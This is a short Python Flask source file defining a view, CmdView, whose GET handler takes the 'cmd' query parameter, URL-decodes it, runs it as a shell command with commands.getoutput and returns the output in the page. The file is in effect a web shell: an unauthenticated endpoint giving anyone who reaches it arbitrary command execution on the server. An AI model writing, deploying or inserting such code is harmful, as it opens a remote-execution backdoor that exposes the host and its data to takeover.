import sys,io,os
import urllib
import commands
from flask import request

from flask.views import MethodView
class CmdView(MethodView):
    def get(self):
        cmd = request.args.get('cmd')
        #results = os.popen(urllib.unquote(cmd)).readlines()
        results=commands.getoutput(urllib.unquote(cmd))
        return "<strong>result</strong>:"+results